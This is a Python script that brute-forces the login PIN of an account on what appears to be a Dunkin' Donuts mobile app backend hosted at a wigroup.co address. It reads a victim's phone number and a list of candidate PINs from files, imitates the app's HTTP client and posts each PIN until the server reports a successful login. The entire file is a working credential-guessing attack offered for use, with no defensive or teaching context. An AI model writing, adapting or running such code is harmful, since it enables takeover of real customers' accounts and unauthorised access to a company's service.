import requests
import json

key = input("Enter your API key: ")


url = "emea-nl-template-dunkin-donuts.wigroup.co"

headers = {
    "accept": "application/json, text/plain, */*",
    "accept-encoding": "gzip",
    "apikey": f"{key}",
    "connection": "Keep-Alive",
    "content-type": "application/json",
    "host": "emea-nl-template-dunkin-donuts.wigroup.co",
    "user-agent": "okhttp/3.12.1"
}

with open("input.txt", "r") as f:
    # Read the phone number from the file
    mobile = f.readline().rstrip()

with open("output.txt", "r") as f:
    # Read the list of PINs from the file
    pins = f.readlines()

for pin in pins:
    # Remove trailing newline character
    pin = pin.rstrip()

    data = {
        "pin": pin,
        "mobile": mobile
    }

    response = requests.post(url, headers=headers, data=json.dumps(data))

    print("Trying PIN: {} - Response: {}".format(pin, response.json()["messageBody"]))

    # If the response contains "Logged in successfully", we have found the correct PIN
    if "Logged in successfully" in response.json()["messageBody"]:
        print("PIN found: {}".format(pin))
        break
